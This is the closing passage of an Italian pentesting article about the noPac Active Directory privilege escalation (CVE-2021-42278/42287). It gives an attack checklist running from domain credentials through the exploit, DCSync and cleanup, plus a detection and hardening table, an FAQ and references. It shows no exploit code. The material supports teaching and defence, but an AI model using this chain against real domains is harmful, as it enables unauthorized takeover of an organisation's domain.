+☐ Credenziali di dominio valide ottenute\
+☐ `MachineAccountQuota` verificato\
+☐ Scan eseguito con `--scan`\
+☐ Exploit eseguito\
+☐ DCSync tentato o completato\
+☐ Cleanup del machine account effettuato\
+☐ Evidenze salvate per il report
+
+***
+
+## 🛡️ Detection / Difesa
+
+| Azione            | Descrizione                                        |
+| ----------------- | -------------------------------------------------- |
+| **Patch**         | Applica le patch di novembre 2021                  |
+| **MAQ**           | Imposta `MachineAccountQuota = 0`                  |
+| **Event ID 4741** | Monitora creazione di computer account             |
+| **Event ID 4742** | Monitora modifiche sospette ai machine account     |
+| **Kerberos**      | Controlla richieste anomale su principal macchina  |
+| **ACL**           | Limita chi può creare oggetti computer nel dominio |
+
+La combinazione davvero efficace è: **patching + MAQ a zero + logging serio**.
+
+***
+
+## ❓ FAQ
+
+**Cos'è noPac?**\
+È una catena di privilege escalation che combina CVE-2021-42278 e CVE-2021-42287 per permettere a un utente di dominio di impersonare un Domain Controller e arrivare fino a [DCSync](https://hackita.it/articoli/dcsync).
+
+**noPac funziona ancora nel 2026?**\
+Sì, ma solo su Domain Controller non correttamente patchati. In ambienti maturi è raro; in ambienti legacy è ancora molto pericoloso.
+
+**Serve `MachineAccountQuota`?**\
+Sì, se devi creare un nuovo machine account. Se `MachineAccountQuota = 0`, puoi comunque sfruttare la tecnica solo se controlli già un computer account.
+
+**Qual è la differenza tra noPac e ZeroLogon?**\
+ZeroLogon segue una logica diversa e non richiede lo stesso tipo di abuso identità/Kerberos. noPac invece parte da credenziali valide e sfrutta il comportamento del KDC.
+
+**noPac è un attacco Kerberos?**\
+Sì. Anche se parte dagli account macchina, il cuore della catena è il comportamento del KDC e il rilascio dei ticket Kerberos.
+
+***
+
+## 🔗 Riferimenti Esterni
+
+* [Microsoft Security Response Center — CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)
+* [Microsoft Security Response Center — CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)
+* [Fortra Impacket — Repository Ufficiale](https://github.com/fortra/impacket)
+* [noPac su GitHub (scopedsecurity)](https://github.com/scopedsecurity/noPac)
+
+***
+
+## 🎯 Key Takeaway
+
+**noPac è una delle escalation più rapide e redditizie in Active Directory non patchato: da utente standard a compromissione del dominio con una catena breve, automatizzabile e ad altissimo impatto.**
+
+***
+
+## ❤️ Supporta HackIta
+
+Se questo articolo ti è stato utile e vuoi contribuire alla crescita del progetto, puoi sostenere HackIta con una donazione. Anche un piccolo gesto aiuta a mantenere vivo il progetto e a produrre contenuti di qualità sulla sicurezza informatica.
+
+👉 **[hackita.it/supporto](https://hackita.it/supporto)**
+
+***
+
+## 🛡️ Servizi HackIta
+
+Hai bisogno di qualcosa di più concreto? Offriamo anche:
+
+* 🎓 **Formazione 1:1** — Percorsi personalizzati per ethical hacking, penetration testing e Active Directory
+* 🔥 **Test di vulnerabilità per aziende/siti web** — Scopri se la tua infrastruttura regge prima che lo faccia qualcun altro
+
+👉 **[hackita.it/servizi](https://hackita.it/servizi)**
+
+Grazie per il supporto!
+
+***
+
+*Articolo aggiornato al 2026 - HackIta Security Research*
